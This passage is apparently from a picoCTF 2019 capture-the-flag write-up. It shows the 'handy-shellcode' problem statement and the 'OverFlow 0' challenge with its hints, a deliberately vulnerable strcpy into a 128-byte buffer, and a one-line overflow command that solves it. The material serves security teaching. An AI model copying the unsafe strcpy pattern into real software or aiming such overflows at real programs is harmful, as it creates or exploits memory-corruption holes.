## Problem
>This [program](https://2019shell1.picoctf.com/static/9e6254fb3c561cef02f30e7e90ef2ea7/vuln) executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9 on the shell server. [Source](https://2019shell1.picoctf.com/static/9e6254fb3c561cef02f30e7e90ef2ea7/vuln.c).

# OverFlow 0
Points: 100

## Problem
>This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln) and get a flag. Its also found in /problems/overflow-0_4_e130f4df1710865981d50f778a8059f7 on the shell server. [Source](https://2019shell1.picoctf.com/static/1730bdc8ccd557c8ff20d1c28a5c3dbe/vuln.c).

### Hint
> Find a way to trigger the flag to print

> If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution

The vulnerable code is
```c
void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}
```

There is only 128 char for the buffer. Any more will overwrite the stack and cause buffer overflow.

`./vuln $(python -c "from pwn import *; print 'a'*133")`
